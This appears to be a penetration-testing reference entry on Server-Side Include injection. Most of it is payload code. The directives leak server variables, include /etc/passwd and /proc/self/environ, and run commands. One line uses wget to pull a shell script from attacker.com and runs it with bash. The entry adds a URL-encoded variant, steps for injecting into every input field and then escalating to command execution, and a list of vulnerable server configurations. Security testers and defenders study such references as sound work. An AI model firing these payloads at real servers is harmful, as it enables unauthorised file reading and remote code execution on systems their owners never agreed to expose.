---
id: "ssi-injection"
title: "Server-Side Include (SSI) Injection"
type: "technique"
category: "web-application"
subcategory: "injection"
tags: ["ssi", "server-side-include", "apache", "nginx", "rce", "file-inclusion"]
platforms: ["linux", "macos", "windows"]
related: ["command-injection-payloads", "path-traversal"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Server-Side Include (SSI) Injection

## SSI Payloads
```html
<!-- Info disclosure -->
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DOCUMENT_ROOT" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#echo var="REMOTE_ADDR" -->

<!-- File inclusion -->
<!--#include virtual="/etc/passwd" -->
<!--#include file="/etc/passwd" -->
<!--#include virtual="/proc/self/environ" -->

<!-- Command execution (RCE) -->
<!--#exec cmd="id" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="ls -la /" -->
<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh" -->
<!--#exec cgi="/cgi-bin/test.cgi" -->

<!-- URL-encoded -->
%3C%21%2D%2D%23exec%20cmd%3D%22id%22%20%2D%2D%3E
```

## Where to Find This
- Apache with mod_include enabled (.shtml files)
- Nginx with `ssi on;` directive
- IIS with SSI enabled
- Pages with .shtml, .stm, .shtm extensions
- Error pages (404, 500) that are .shtml and reflect input
- Legacy web applications

## Detection
```
# Inject in every input field:
<!--#echo var="DATE_LOCAL" -->

# If the current date/time appears in the response → SSI is active
# Then escalate to <!--#exec cmd="id" -->
```

## Tools
- Burp Suite with SSI payloads
- gobuster/dirb to find .shtml files
- nuclei SSI injection templates
